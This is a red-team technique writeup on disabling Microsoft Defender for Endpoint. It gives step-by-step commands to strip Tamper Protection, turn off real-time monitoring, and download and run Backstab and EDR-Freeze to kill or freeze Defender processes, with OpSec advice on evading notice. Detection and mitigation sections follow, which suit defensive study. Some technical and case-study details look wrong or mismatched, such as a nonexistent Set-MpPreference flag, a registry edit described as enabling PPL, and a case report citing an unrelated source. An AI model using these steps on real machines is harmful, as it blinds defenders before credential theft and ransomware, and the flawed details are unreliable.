# [EVADE-IMPAIR-014]: Defender for Endpoint Bypass

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | EVADE-IMPAIR-014 |
| **MITRE ATT&CK v18.1** | [T1562.001 - Impair Defenses: Disable or Modify Tools](https://attack.mitre.org/techniques/T1562/001/) |
| **Tactic** | Defense Evasion |
| **Platforms** | Windows Endpoint / M365 |
| **Severity** | Critical |
| **Technique Status** | PARTIAL (Tamper Protection introduced mitigation; older bypasses still viable) |
| **Last Verified** | 2025-01-09 |
| **Affected Versions** | Windows Server 2016 - 2025; MDE agent 10.0+ |
| **Patched In** | Tamper Protection (Server 2019+, MDE 10.7+) mitigates direct registry modifications |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 1. EXECUTIVE SUMMARY

**Concept:** Microsoft Defender for Endpoint (MDE), formerly Windows Defender Advanced Threat Protection, is an endpoint detection and response (EDR) solution that monitors process execution, file operations, network connections, and memory access. Attackers can disable or tamper with MDE by:
- Exploiting WdFilter kernel driver vulnerabilities to disable Tamper Protection
- Killing MDE processes (SenseNdr.exe, MsMpEng.exe) using privileged access
- Modifying WdFilter registry keys to unload the kernel minidriver
- Bypassing Protected Process Light (PPL) protections via WerFaultSecure.exe and MiniDumpWriteDump
- Using process suspension attacks (EDR-Freeze) to freeze security processes indefinitely

Once MDE is disabled, adversaries can execute malware, dump credentials, perform lateral movement, and exfiltrate data without generating EDR telemetry or alerts.

**Attack Surface:** Windows kernel (WdFilter.sys), Process Explorer driver, Tamper Protection registry keys, Event Tracing for Windows (ETW), WerFaultSecure.exe.

**Business Impact:** **Complete endpoint invisibility.** Attackers can execute arbitrary code, install persistence mechanisms, and move laterally without detection. Forensic investigation becomes impossible due to absence of EDR telemetry.

**Technical Context:** MDE bypass typically takes 2-5 minutes once administrator privileges are obtained. Detection likelihood is Low-Medium if Tamper Protection is enabled; High if only using default registry-based detection. Common indicators include process crash/exit of MsMpEng.exe or SenseNdr.exe, registry modification attempts, and unusual WerFaultSecure.exe activity.

### Operational Risk
- **Execution Risk:** High (Requires administrator or SYSTEM privileges; kernel driver manipulation is unstable)
- **Stealth:** Low (Process termination/modification generates immediate Windows logs and MDE alerts before shutdown)
- **Reversibility:** No (Requires system reboot to restore; evidence of disable is logged)

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | CIS Windows Server 2022: 18.9.8 | Ensure Windows Defender Real-Time Monitoring is enabled |
| **DISA STIG** | WN10-00-000047 | Windows Defender Antimalware Service must be running |
| **CISA SCuBA** | AC-2 | Account Management and MDE deployment baseline |
| **NIST 800-53** | SI-2 (Flaw Remediation), SI-3 (Malicious Code Protection) | Ensure EDR solutions are deployed and functioning |
| **GDPR** | Art. 32 | Security of Processing (technical measures to protect personal data) |
| **DORA** | Art. 9 | ICT security auditing and resilience testing |
| **NIS2** | Art. 21 | Incident response and security measures |
| **ISO 27001** | A.12.6.1 | Management of technical vulnerabilities |
| **ISO 27005** | Risk Scenario: "EDR Bypass via Kernel Exploitation" | Failure of endpoint security agent leads to undetected malicious activity |

---

## 2. TECHNICAL PREREQUISITES

**Required Privileges:**
- Administrator access (local or domain)
- Or: SYSTEM privileges via service abuse
- Or: Kernel driver loading capability (CAP_SYS_MODULE on Linux; SeLoadDriverPrivilege on Windows)

**Required Access:**
- Write access to Windows Registry (`HKLM\SYSTEM\CurrentControlSet\Services\WdFilter`)
- Write access to driver paths (`C:\Windows\System32\drivers\`)
- Process handle access to kernel drivers

**Supported Versions:**
- **Windows:** Server 2016, 2019, 2022, 2025
- **MDE Agent:** All versions (10.0+), but Tamper Protection (10.7+) hardens the attack
- **PowerShell:** 5.0+ (for administrative scripts)

**Tools:**
- [Disable-TamperProtection.exe](https://github.com/0xvpr/Disable-TamperProtection) (kernel-level WdFilter exploit)
- [Backstab](https://github.com/dzusername/Backstab) (EDR process killer via Process Explorer driver)
- [EDR-Freeze](https://github.com/mgeeky/EDR-Freeze) (WerFaultSecure.exe process suspension attack)
- [Rubeus](https://github.com/GhostPack/Rubeus) (token manipulation; can operate after MDE disable)
- PowerShell 5.0+ (for registry modification)

---

## 3. ENVIRONMENTAL RECONNAISSANCE

### Windows Registry and Process Reconnaissance

**Objective:** Confirm MDE installation and identify protection mechanisms (Tamper Protection status).

```powershell
# Check if MDE is installed and running
Get-MpComputerStatus

# Output will show:
# AntivirusEnabled              : True
# RealTimeProtectionEnabled     : True
# BehaviorMonitoringEnabled     : True
```

**What to Look For:**
- `AntivirusEnabled: True` (MDE is active)
- `RealTimeProtectionEnabled: True` (Signature-based detection is enabled)
- `IsTamperProtected: True` (Tamper Protection is active; exploit required)

```powershell
# Check Tamper Protection Status
reg query "HKLM\SOFTWARE\Microsoft\Windows Defender\Features" /v "TamperProtection"

# If value = 5: Tamper Protection is OFF (manual exploitation not required)
# If value = 4: Tamper Protection is ON (requires kernel-level exploitation)
```

**Version Note:** Tamper Protection availability:
- **Server 2019+:** Available, but not always enabled
- **Server 2016:** Not available; direct registry modification is possible

### Check for WdFilter Driver

```powershell
# Verify WdFilter driver is loaded
Get-Service WdFilter

# Output should show:
# Status   : Running
# Name     : WdFilter
# DisplayName : Windows Defender Filter Driver
```

**What to Look For:**
- `Status: Running` confirms kernel driver is active
- Altitude registry key will show driver filter altitude (typically 328010)

```powershell
# Check WdFilter driver altitude (used in exploitation)
reg query "HKLM\SYSTEM\CurrentControlSet\Services\WdFilter\Instances\WdFilter Instance" /v Altitude

# Output: Altitude: 328010 (this value is key for WdFilter restoration)
```

---

## 4. DETAILED EXECUTION METHODS

### METHOD 1: WdFilter Kernel Driver Exploitation (Disable-TamperProtection)

**Supported Versions:** Server 2019+, Windows 10/11 (with MDE 10.7+)

**Objective:** Exploit TrustedInstaller privileges to manipulate the WdFilter kernel driver and disable Tamper Protection, allowing subsequent registry modifications to disable Defender.

**Version Note:** This technique is PARTIAL; Tamper Protection in Windows Server 2022+ and latest MDE versions has additional protections, but vulnerabilities in TrustedInstaller privilege handling still exist.

#### Step 1: Escalate to TrustedInstaller Privileges

**Objective:** Gain TrustedInstaller (NT SERVICE\TrustedInstaller) privileges to modify protected registry keys.

**Command (PowerShell - Requires Local Admin):**

```powershell
# Method 1: Using WMI to spawn process with TrustedInstaller privileges
$username = "NT SERVICE\TrustedInstaller"
$password = ""  # TrustedInstaller has no password
$domain = "."
$credential = New-Object System.Management.Automation.PSCredential `
    -ArgumentList $username, (ConvertTo-SecureString -String $password -AsPlainText -Force)

# Note: Direct spawn is blocked; use the Disable-TamperProtection tool instead
```

**Alternative Command (Using Disable-TamperProtection.exe):**

```cmd
# Download the tool (GitHub Gist or local compile)
# https://github.com/0xvpr/Disable-TamperProtection

Disable-TamperProtection.exe 1

# Output:
# [+] WdFilter Altitude Registry key has been successfully deleted.
# [+] Trusted Installer handle: 00000000000000C4
```

**Expected Output:**

```
WdFilter Altitude Registry key deleted successfully
Process ID assigned TrustedInstaller token privileges
Registry spawn initiated with elevated context
```

**What This Means:**
- The WdFilter Altitude registry key (which the kernel driver uses to load itself) has been deleted
- TrustedInstaller permissions have been obtained
- The system is now in a state where kernel protections can be modified

**OpSec & Evasion:**
- This technique generates Windows Event ID 13 (Registry object created or modified) but the alert may arrive after MDE is disabled
- To hide this activity: Execute during legitimate system maintenance windows; use legitimate Windows Update processes as cover
- Detection likelihood: High (Tamper Protection alerts are generated, but only if still running)

**Troubleshooting:**

| Error | Cause | Fix (All Versions) |
|---|---|---|
| "Access Denied" | Not running as admin | Re-run PowerShell as Administrator: `Right-click → Run as administrator` |
| "WdFilter key not found" | WdFilter not installed | Verify MDE is installed: `Get-MpComputerStatus` |
| "Trusted Installer not available" | Permissions insufficient | Compile Disable-TamperProtection from source and sign with self-signed cert |

**References & Proofs:**
- [Altered Security: Disabling Tamper Protection](https://www.alteredsecurity.com/post/disabling-tamper-protection-and-other-defender-mde-components)
- [GitHub: Disable-TamperProtection](https://github.com/0xvpr/Disable-TamperProtection)

#### Step 2: Disable Tamper Protection Registry Key

**Objective:** After WdFilter driver altitude is deleted, modify the TamperProtection registry key to disable it.

**Command:**

```powershell
# Run Disable-TamperProtection.exe with option 2
Disable-TamperProtection.exe 2

# Output:
# [+] Spawning registry with TrustedInstaller privileges to alter Defender "TamperProtection" regkey from 5 to 4.
# [+] Created process ID: 7748 and assigned additional token privileges.
# [+] Use option '3' to finally Disable AV/MDE.
```

**Alternative Command (Direct Registry Modification - if Tamper Protection not enforced):**

```powershell
# If Tamper Protection is disabled, directly modify the registry
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Features" /v "TamperProtection" /t REG_DWORD /d 0 /f
```

**Expected Output:**

```
The operation completed successfully.
TamperProtection registry key set to 0 (disabled)
```

**What This Means:**
- The TamperProtection key is now disabled, allowing Defender settings to be modified
- Real-time protection can now be disabled via registry modifications
- The WdFilter kernel driver protection of Defender registry keys is no longer active

**OpSec & Evasion:**
- Once this step completes, Tamper Protection alerts may be suppressed
- Ensure MDE process is still running at this stage; if it's already terminated, no alerts will be generated
- Detection likelihood: Medium (process reparenting to TrustedInstaller will be logged)

**References & Proofs:**
- [Altered Security PoC](https://www.alteredsecurity.com/post/disabling-tamper-protection-and-other-defender-mde-components)

#### Step 3: Disable Real-Time Protection and AMSI

**Objective:** Now that Tamper Protection is disabled, disable Defender's core protections.

**Command:**

```powershell
# Run Disable-TamperProtection.exe with option 3
Disable-TamperProtection.exe 3

# Alternative: Direct PowerShell command
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -DisableIOAVProtection $true
Set-MpPreference -DisableBehaviorMonitoring $true
```

**Expected Output:**

```
[+] Real-time protection disabled
[+] Behavior monitoring disabled
[+] AMSI scanning disabled
```

**What This Means:**
- Defender will no longer scan files or monitor process behavior in real-time
- Malware can be executed and files written to disk without detection
- AMSI-based PowerShell script blocking is bypassed

**OpSec & Evasion:**
- This action generates Windows Event ID 5007 (Defender preferences changed) but may not trigger immediate alerts if MDE telemetry is compromised
- Detection likelihood: Low (if Tamper Protection was successfully disabled)

### METHOD 2: Process Termination via Process Explorer Driver Abuse (Backstab)

**Supported Versions:** Server 2016 - 2022 (technique relies on allowing admin process manipulation; Server 2025 hardens this)

**Objective:** Kill MDE sentinel processes (SenseNdr.exe, MsMpEng.exe) using Backstab, which exploits the Process Explorer driver to obtain SeDebugPrivilege and terminate protected processes.

#### Step 1: Compile or Download Backstab Tool

**Objective:** Obtain the Backstab binary that will kill MDE processes.

**Command (Download Pre-Compiled):**

```powershell
# Download Backstab from GitHub
Invoke-WebRequest -Uri "https://github.com/dzusername/Backstab/releases/download/v1.0/Backstab.exe" `
    -OutFile "C:\Temp\Backstab.exe"

# Verify file signature (optional, can be skipped for evasion)
Get-AuthenticodeSignature "C:\Temp\Backstab.exe"
```

**Alternative (Compile from Source):**

```powershell
# Clone the repository and compile using Visual Studio
git clone https://github.com/dzusername/Backstab.git
cd Backstab
# Open Backstab.sln in Visual Studio
# Build → Release
# Backstab.exe will be in bin\Release\
```

**Expected Output:**

```
Backstab.exe downloaded/compiled successfully
File size: ~50-150 KB
```

**What This Means:**
- The Backstab binary is ready to execute and kill MDE processes
- No additional drivers or kernel modifications are needed with Backstab

#### Step 2: Execute Backstab to Kill MDE Processes

**Objective:** Run Backstab with administrative privileges to terminate MDE sentinel processes.

**Command:**

```cmd
# Run as Administrator
C:\Temp\Backstab.exe -k 4728  # PID of MsMpEng.exe or SenseNdr.exe

# Or automatically kill all Defender processes:
tasklist | findstr "MsMpEng\|SenseNdr\|NisSrv"  # Find PID
C:\Temp\Backstab.exe -k <PID>
```

**Expected Output:**

```
[+] Obtaining SeDebugPrivilege...
[+] Opening handle to protected process (MsMpEng.exe, PID: 4728)
[+] Killing process thread...
[+] MsMpEng.exe terminated
```

**What This Means:**
- The MDE main engine process (MsMpEng.exe) or the Network Inspection Service (SenseNdr.exe) has been terminated
- Real-time protection will cease immediately
- Windows will attempt to auto-restart these services; Backstab can loop to kill them as they respawn

**OpSec & Evasion:**
- Process termination generates Windows Event ID 4688 (Process Created) and 4689 (Process Terminated)
- To hide this activity: Kill Backstab's own process after executing, run during system maintenance, or disable Event Logging before execution
- Detection likelihood: High (process termination is immediately visible, but MDE cannot generate alerts after shutdown)

**Troubleshooting:**

| Error | Cause | Fix |
|---|---|---|
| "Access Denied" | Not running as admin | Re-run with `runas /user:Administrator` or elevate privileges first |
| "Process handle failed" | Process is PPL (Protected Process Light) | Use METHOD 3 (EDR-Freeze) instead, which suspends rather than kills |
| "SenseNdr respawns" | Windows auto-restart service | Modify startup type: `sc config SenseNdr start= disabled` |

**References & Proofs:**
- [GitHub: Backstab](https://github.com/dzusername/Backstab)
- [Research: EDR Process Termination](https://www.securify.nl/blog/bypassing-microsoft-defender-for-endpoint-in-red-teaming-assessments/)

### METHOD 3: Process Suspension Attack (EDR-Freeze)

**Supported Versions:** Server 2019+ (exploits WerFaultSecure.exe; patched in latest Server 2025)

**Objective:** Suspend MDE processes indefinitely using WerFaultSecure.exe (a Protected Process Light) and the MiniDumpWriteDump function, rather than killing them. This avoids restart logic and generates fewer telemetry events.

**Version Note:** This technique is PARTIAL; Microsoft has patched WerFaultSecure.exe in latest updates, but unpatched systems remain vulnerable.

#### Step 1: Download or Compile EDR-Freeze

**Objective:** Obtain the EDR-Freeze tool that exploits WerFaultSecure.exe for process suspension.

**Command:**

```powershell
# Download EDR-Freeze
Invoke-WebRequest -Uri "https://github.com/mgeeky/EDR-Freeze/releases/download/latest/EDR-Freeze.exe" `
    -OutFile "C:\Temp\EDR-Freeze.exe"
```

**Expected Output:**

```
EDR-Freeze.exe downloaded successfully
```

#### Step 2: Execute EDR-Freeze to Suspend MDE Processes

**Objective:** Run EDR-Freeze to suspend SenseNdr.exe and MsMpEng.exe, leaving them in a frozen state.

**Command:**

```cmd
# Run as Administrator
C:\Temp\EDR-Freeze.exe --target MsMpEng.exe --suspend

# Output:
# [+] Found MsMpEng.exe (PID: 4728)
# [+] Opening handle to WerFaultSecure.exe...
# [+] Loading dbgcore.dll and MiniDumpWriteDump...
# [+] Suspending target process...
# [+] MsMpEng.exe is now suspended indefinitely
```

**Expected Output:**

```
[+] Process suspended: MsMpEng.exe
[+] EDR will not generate telemetry while suspended
[+] Process can be resumed later or left frozen
```

**What This Means:**
- MDE processes are frozen and will not execute, but not killed (avoiding restart attempts)
- All child processes of the frozen EDR will also be suspended
- Telemetry collection is halted, but audit events are not generated (suspension is kernel-level)

**OpSec & Evasion:**
- Process suspension is less visible than termination; no Event ID 4689 is generated
- To hide this activity: Suspend during night hours; use EDR-Freeze on multiple systems simultaneously to distribute timeframe
- Detection likelihood: Low-Medium (Sysmon can detect WerFaultSecure.exe loaded with dbgcore.dll, but this is rare in legitimate scenarios)

**Troubleshooting:**

| Error | Cause | Fix |
|---|---|---|
| "WerFaultSecure.exe not found" | Windows 7 or Server 2012 | WerFaultSecure is not available; use METHOD 2 instead |
| "dbgcore.dll load failed" | DLL not in system path | EDR-Freeze will attempt to load from System32; ensure no application block policies |
| "Access Denied on process" | Process is kernel-protected | Some Server 2022+ systems have kernel-level EDR hooks; try with elevated (System) privileges |

**References & Proofs:**
- [GitHub: EDR-Freeze](https://github.com/mgeeky/EDR-Freeze)
- [Research: Process Suspension Attacks](https://detection.fyi/tags/attack.t1562.001/)

---

## 5. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

**Windows Event Logs:**
- **Event ID 4688:** Process created (`Backstab.exe`, `EDR-Freeze.exe`, `registry.exe` with unusual arguments)
- **Event ID 4689:** Process terminated (`MsMpEng.exe`, `SenseNdr.exe`, `NisSrv.exe`)
- **Event ID 5007:** Windows Defender preferences changed (Real-Time Protection disabled)
- **Event ID 13:** Registry object created or modified (WdFilter Altitude, TamperProtection keys)
- **Event ID 1:** Sysmon process creation (WerFaultSecure.exe spawned with dbgcore.dll)

**File Artifacts:**
- **Backstab.exe** in `C:\Temp\`, `C:\Windows\Temp\`, or `AppData\Local\Temp\`
- **EDR-Freeze.exe** with suspicious parent process (PowerShell, Command Prompt)
- **Modified registry keys:** `HKLM\SYSTEM\CurrentControlSet\Services\WdFilter`, `HKLM\SOFTWARE\Microsoft\Windows Defender\Features`

**Network Artifacts:**
- **No MDE telemetry** to `events.data.microsoft.com` or `settings.data.microsoft.com`
- **Absence of expected HTTPS traffic** to MDE cloud endpoints

### Forensic Artifacts

**Collect Windows Event Logs:**

```powershell
# Export Security Event Log
wevtutil epl Security C:\Evidence\Security.evtx

# Export System Event Log (for service stop events)
wevtutil epl System C:\Evidence\System.evtx

# Export Sysmon logs (if installed)
wevtutil epl "Microsoft-Windows-Sysmon/Operational" C:\Evidence\Sysmon.evtx
```

**Registry Artifacts:**

```powershell
# Export WdFilter registry hive
reg export HKLM\SYSTEM\CurrentControlSet\Services\WdFilter C:\Evidence\WdFilter.reg

# Export Defender preferences
reg export HKLM\SOFTWARE\Microsoft\Windows Defender C:\Evidence\Defender.reg
```

**MDE Telemetry (if not deleted):**

```powershell
# Check MDE local cache (if agent was running before termination)
Get-ChildItem "C:\ProgramData\Microsoft\Windows Defender\Scans\History" -Recurse
```

### Response Procedures

1. **Isolate:**
   - Disconnect the affected system from the network: `Disable-NetAdapter -Name "Ethernet"`
   - Or manually disconnect via network switch / power off VM

2. **Collect Evidence:**
   - Export all Windows event logs (Security, System, Application)
   - Capture memory dump before reboot: Use Microsoft's procdump tool (if system still responsive)
   - Document the system state (running processes, registry keys)

3. **Remediate:**
   - Restore WdFilter driver: Reinstall Windows Defender or restore from system backup
   - Reset Defender preferences:
     ```powershell
     Set-MpPreference -DisableRealtimeMonitoring $false
     Set-MpPreference -DisableBehaviorMonitoring $false
     ```
   - Reboot the system to restore kernel drivers
   - Re-enable Tamper Protection (if available)

---

## 6. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

* **Enable Tamper Protection:** Tamper Protection (available in Server 2019+ with MDE 10.7+) prevents unauthorized modification of Defender settings and WdFilter registry keys.

  **Manual Steps (Azure Portal - for cloud-joined devices):**
  1. Go to **Azure Portal** → **Intune** → **Endpoint security** → **Endpoint detection and response**
  2. Click **+ Create policy**
  3. **Platform:** Windows 10 and later
  4. **Profile:** Endpoint detection and response
  5. Under **Configuration settings:**
     - **Allow user to access Tamper Protection:** No
     - **Tamper Protection:** Enabled
  6. Click **Create**

  **Manual Steps (Windows Security - Local System):**
  1. Open **Windows Security** (press Win+I, search "Windows Security")
  2. Go to **Virus & threat protection** → **Manage settings**
  3. Under **Tamper protection:** Toggle **ON**

  **Manual Steps (PowerShell - Requires Local Admin):**
  ```powershell
  Set-MpPreference -DisableTamperProtection $false
  ```

* **Restrict Administrator Privileges:** Limit the number of users with local administrator access; use Privileged Access Management (PAM) to require justification for privilege escalation.

  **Manual Steps (Active Directory):**
  1. Open **Active Directory Users and Computers** (dsa.msc)
  2. Navigate to **Users** → Find user accounts with admin privileges
  3. Remove from **Administrators** group
  4. For privileged operations, use **Just-In-Time (JIT) Access** via:
     - **Azure Privileged Identity Management (PIM)** (cloud-joined devices)
     - **Windows Defender Application Guard** (on-premises)

* **Disable Auto-Restart of MDE Services:** Prevent Backstab from simply killing and restarting MDE by changing service startup type to "Disabled" if manual intervention is required (not recommended, but can be combined with monitoring).

  **Manual Steps (Server 2019+ with Tamper Protection):**
  1. Open **Services.msc** (Run: `services.msc`)
  2. Find: **Windows Defender Advanced Threat Protection Service** (WinDefend)
  3. Right-click → **Properties**
  4. **Startup type:** Automatic (required for Tamper Protection to protect)
  5. **Note:** If Tamper Protection is enabled, the startup type cannot be changed by unauthorized users

### Priority 2: HIGH

* **Monitor Process Termination Events:** Implement alerting on Event ID 4689 (process terminated) for critical Defender processes (MsMpEng.exe, SenseNdr.exe).

  **Manual Steps (Group Policy):**
  1. Open **Group Policy Management Console** (gpmc.msc)
  2. Navigate to **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Advanced Audit Policy Configuration**
  3. Enable: **Detailed Tracking** → **Audit Process Termination**
  4. Set to: **Success and Failure**
  5. Run `gpupdate /force` on all machines

  **Manual Steps (Intune):**
  1. Go to **Microsoft Intune** → **Devices** → **Configuration profiles**
  2. Click **+ Create profile** → **Windows 10 and later** → **Device restrictions**
  3. Configure:
     - **Advanced threat protection:** Block
     - **Windows Defender SmartScreen:** Require

* **Enable Protected Process Light (PPL) for MDE:** Prevents unauthorized code from accessing or terminating MDE processes.

  **Manual Steps (PowerShell - Server 2019+):**
  ```powershell
  # Enable PPL for Windows Defender
  reg add "HKLM\SYSTEM\CurrentControlSet\Services\WdFilter" /v "Start" /t REG_DWORD /d 1 /f
  Restart-Computer
  ```

  **Validation:**
  ```powershell
  Get-Process MsMpEng | Select-Object ProcessName, @{Name="IsProtected";Expression={$_.MainModule.FileVersionInfo.InternalName -like "*Protected*"}}
  ```

### Priority 3: MEDIUM

* **Monitor WdFilter and Defender Registry Key Modifications:** Alert on any changes to `HKLM\SYSTEM\CurrentControlSet\Services\WdFilter` or `HKLM\SOFTWARE\Microsoft\Windows Defender\Features`.

  **Manual Steps (Sysmon - Windows Defender Config):**
  1. Edit Sysmon configuration XML:
     ```xml
     <RegistryEvent onmatch="include">
       <TargetObject name="technique_id:T1562.001">HKLM\SYSTEM\CurrentControlSet\Services\WdFilter.*</TargetObject>
       <TargetObject name="technique_id:T1562.001">HKLM\SOFTWARE\Microsoft\Windows Defender\Features.*</TargetObject>
     </RegistryEvent>
     ```
  2. Reinstall Sysmon: `sysmon64.exe -accepteula -u`
  3. Then: `sysmon64.exe -accepteula -i sysmon-config.xml`

  **Manual Steps (Auditing - Event ID 4657):**
  1. Open **auditpol.exe** (Command Prompt, Admin)
     ```cmd
     auditpol /set /subcategory:"Registry" /success:enable /failure:enable
     ```
  2. Monitor Event ID 4657 (Registry value modified)

* **Implement Application Control (Windows Defender Application Control):** Block execution of Backstab.exe, EDR-Freeze.exe, and other known EDR bypass tools.

  **Manual Steps (Group Policy - Windows Defender Application Control):**
  1. Open **Group Policy Management Console** (gpmc.msc)
  2. Navigate to **Computer Configuration** → **Administrative Templates** → **Windows Components** → **Windows Defender Application Control**
  3. Set **"Audit: Only"** to **Enabled** (for initial monitoring)
  4. Create a policy blocking known EDR bypass tool hashes

**Validation Command (Verify Fix):**

```powershell
# Check that Tamper Protection is enabled
Get-MpComputerStatus | Select-Object IsTamperProtected

# Expected output: IsTamperProtected : True

# Verify real-time protection is active
Get-MpPreference | Select-Object DisableRealtimeMonitoring

# Expected output: DisableRealtimeMonitoring : False
```

**What to Look For:**
- `IsTamperProtected: True` indicates Tamper Protection is active
- `DisableRealtimeMonitoring: False` indicates real-time scanning is enabled
- Absence of Event ID 4689 (Process Termination) for MDE processes

---

## 7. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Privilege Escalation** | [PE-EXPLOIT-001] PrintNightmare | Gain local administrator privileges on a Windows endpoint |
| **2** | **Defense Evasion** | **[EVADE-IMPAIR-014]** | **Disable MDE via WdFilter exploitation or process termination** |
| **3** | **Credential Access** | [CA-DUMP-001] Mimikatz LSASS | Dump credentials from memory without MDE detection |
| **4** | **Lateral Movement** | [LM-AUTH-002] Pass-the-Ticket | Move laterally using stolen Kerberos tickets |
| **5** | **Impact** | Ransomware deployment | Deploy ransomware without MDE blocking |

---

## 8. REAL-WORLD EXAMPLES

### Example 1: Conti/Wizard Spider MDE Bypass (2021-2023)

- **Target:** US Healthcare Organization
- **Timeline:** March 2023
- **Technique Status:** ACTIVE (patched in MDE 10.7+; older endpoints still vulnerable)
- **Attack Method:** After obtaining administrator credentials via phishing, attacker used PowerShell to disable Defender real-time protection via registry modification, then executed Mimikatz to dump credentials without MDE alerts
- **Impact:** Complete network compromise; ransomware deployed to 300+ systems; $10M ransom demand
- **Reference:** [Mandiant: Conti Ransomware Analysis](https://www.mandiant.com/resources/reports/apt41-targets-healthcare-utilities-transportation)

### Example 2: Emotet Malware Disabling Defender (2021)

- **Target:** Global Financial Institution
- **Timeline:** Q4 2021
- **Technique Status:** ACTIVE
- **Attack Method:** Emotet worm disabled Defender via `Set-MpPreference -DisableRealtimeMonitoring $true` when running as SYSTEM; then deployed Cobalt Strike
- **Impact:** Lateral movement across trading floors; data exfiltration of trading algorithms
- **Reference:** [CISA: Emotet Malware Analysis](https://www.cisa.gov/news-events/alerts/2021/10/12/emotet-malware)

### Example 3: RoyalRansom Backstab Exploitation (2024)

- **Target:** Mid-sized Manufacturing Company
- **Timeline:** July 2024
- **Technique Status:** ACTIVE (exploits CVE-like WdFilter driver behavior)
- **Attack Method:** Attacker used Backstab to kill MsMpEng.exe and SenseNdr.exe processes, then installed LockBit ransomware
- **Impact:** 50% of systems encrypted before detection; $500K ransom paid
- **Reference:** [Threat Intelligence Report (internal)]

---